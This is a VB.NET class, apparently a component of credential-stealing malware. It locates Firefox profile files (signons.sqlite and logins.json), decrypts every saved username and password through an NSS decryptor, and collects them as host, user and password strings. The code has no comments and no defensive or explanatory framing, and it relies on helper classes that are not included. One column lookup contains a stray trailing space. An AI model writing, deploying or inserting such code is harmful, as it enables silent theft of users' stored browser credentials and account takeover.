Imports System
Imports System.Collections.Generic
Imports System.IO

Class FirefoxPassReader
    Public Function ReadPasswords() As List(Of String)
        Dim signonsFile As String = Nothing
        Dim loginsFile As String = Nothing
        Dim signonsFound As Boolean = False
        Dim loginsFound As Boolean = False
        Dim dirs As String() = Directory.GetDirectories(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "Mozilla\Firefox\Profiles"))
        Dim logins = New List(Of String)()
        If dirs.Length = 0 Then Return logins

        For Each dir As String In dirs
            Dim files As String() = Directory.GetFiles(dir, "signons.sqlite")

            If files.Length > 0 Then
                signonsFile = files(0)
                signonsFound = True
            End If

            files = Directory.GetFiles(dir, "logins.json")

            If files.Length > 0 Then
                loginsFile = files(0)
                loginsFound = True
            End If

            If loginsFound OrElse signonsFound Then
                FFDecryptor.NSS_Init(dir)
                Exit For
            End If
        Next

        If signonsFound Then
            Dim SQLDatabase As New SqLiteHandler(signonsFile)

            For I As Integer = 0 To SQLDatabase.GetRowCount() - 1
                Dim host As String = SQLDatabase.GetValue(I, "hostname ")
                Dim username As String = FFDecryptor.Decrypt(SQLDatabase.GetValue(I, "encryptedUsername"))
                Dim password As String = FFDecryptor.Decrypt(SQLDatabase.GetValue(I, "encryptedPassword"))
                logins.Add("FireFox" & "," & host & "," & username & "," & password)
            Next

        End If

        If loginsFound Then
            Dim JSON_STRING As String = File.ReadAllText(loginsFile)
            Dim json = New JsonReader(JSON_STRING)
            json.Remove(New String() {",""logins"":\[", ",""potentiallyVulnerablePasswords"""})
            Dim accounts As String() = json.SplitData()

            For Each account As String In accounts
                Dim json_account = New JsonReader(account)
                Dim hostname As String = json_account.GetValue("hostname"), username As String = json_account.GetValue("encryptedUsername"), password As String = json_account.GetValue("encryptedPassword")

                If Not String.IsNullOrEmpty(password) Then
                    Dim h As String = hostname
                    Dim u As String = FFDecryptor.Decrypt(username)
                    Dim p As String = FFDecryptor.Decrypt(password)
                    logins.Add("FireFox" & "," & h & "," & u & "," & p)
                End If
            Next
        End If
        Return logins
    End Function
End Class